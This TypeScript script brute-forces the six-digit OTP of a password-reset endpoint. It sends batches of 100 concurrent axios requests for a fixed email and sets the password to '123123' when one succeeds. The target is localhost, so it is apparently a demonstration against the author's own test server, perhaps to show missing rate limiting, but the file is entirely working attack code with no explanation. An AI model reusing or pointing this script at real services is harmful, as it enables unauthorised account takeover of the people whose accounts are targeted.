import axios from "axios";

let hacked = false;

async function main(otp: number) {
  let data = JSON.stringify({
    email: "gourav@gmail.com",
    otp,
    newPassword: "123123",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    if (response.status === 200) hacked = true;
    console.log("Worked for otp: " + otp);
  } catch (error: any) {
    // console.log(error.message + " for otp " + otp);
  }
}

async function send() {
  let promises = [];
  for (let i = 100000; i < 1000000; i += 100) {
    if (hacked) break;
    for (let j = 0; j < 100; j++) {
      promises.push(main(i + j));
    }

    console.log("Promise array length", promises.length);
    await Promise.all(promises);
    promises = [];
    console.log(i);
  }
}

send();

// main(543191);
